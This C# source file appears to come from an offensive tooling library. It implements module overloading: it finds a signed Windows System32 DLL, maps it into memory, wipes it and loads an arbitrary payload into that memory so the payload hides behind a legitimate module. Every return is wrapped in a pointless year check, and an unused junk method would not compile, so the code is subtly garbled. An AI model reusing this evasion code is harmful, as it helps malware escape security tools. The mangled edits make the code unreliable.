using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace DInvokeResolver.DInvoke.ManualMap
{
    public class Overload
    {
    private static string Yb2c3d4()
    {
        if(DateTime.Now.Year > 2020) { return Convert.ToBase64String(Encoding.UTF8.GetBytes("dummy")); } else { return null; }
    }
        
        
        
        
        
        
        
        
        
        public static string FindDecoyModule(long MinSize, bool LegitSigned = true)
        {
            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
                }
            }

            

            Random r = new Random();
            
            List<int> candidates = new List<int>();
            while (candidates.Count != files.Count)
            {
                
                int rInt = r.Next(0, files.Count);
                string currentCandidate = files[rInt];

                
                if (candidates.Contains(rInt) == false &&
                    new FileInfo(currentCandidate).Length >= MinSize)
                {
                    
                    if (LegitSigned == true)
                    {
                        if (Utilities.Utilities.FileHasValidSignature(currentCandidate) == true)
                            if(DateTime.Now.Year > 2020) { return currentCandidate; } else { return null; }
                        else
                            candidates.Add(rInt);
                    }
                    else
                        if(DateTime.Now.Year > 2020) { return currentCandidate; } else { return null; }
                }
                candidates.Add(rInt);
            }
            if(DateTime.Now.Year > 2020) { return string.Empty; } else { return null; }
        }

        
        
        
        
        
        
        
        
        public static Data.PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null, bool LegitSigned = true)
        {
            
            if (!File.Exists(PayloadPath))
            {
                throw new InvalidOperationException("Payload filepath not found.");
            }
            byte[] Payload = File.ReadAllBytes(PayloadPath);

            if(DateTime.Now.Year > 2020) { return OverloadModule(Payload, DecoyModulePath, LegitSigned); } else { return null; }
        }

        
        
        
        
        
        
        
        
        public static Data.PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null, bool LegitSigned = true)
        {
            
            if (!string.IsNullOrEmpty(DecoyModulePath))
            {
                if (!File.Exists(DecoyModulePath))
                {
                    throw new InvalidOperationException("Decoy filepath not found.");
                }
                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
                if (DecoyFileBytes.Length < Payload.Length)
                {
                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
                }
            }
            else
            {
                DecoyModulePath = FindDecoyModule(Payload.Length);
                if (string.IsNullOrEmpty(DecoyModulePath))
                {
                    throw new InvalidOperationException("Failed to find suitable decoy module.");
                }
            }

            
            Data.PE.PE_MANUAL_MAP DecoyMetaData = Map.MapModuleFromDiskToSection(DecoyModulePath);
            IntPtr RegionSize = DecoyMetaData.PEINFO.Is32Bit ? (IntPtr)DecoyMetaData.PEINFO.OptHeader32.SizeOfImage : (IntPtr)DecoyMetaData.PEINFO.OptHeader64.SizeOfImage;

            
            DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, Data.Win32.WinNT.PAGE_READWRITE);

            
            DynamicInvoke.Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);

            
            Data.PE.PE_MANUAL_MAP OverloadedModuleMetaData = Map.MapModuleToMemory(Payload, DecoyMetaData.ModuleBase);
            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;

            if(DateTime.Now.Year > 2020) { return OverloadedModuleMetaData; } else { return null; }
        }
    }
}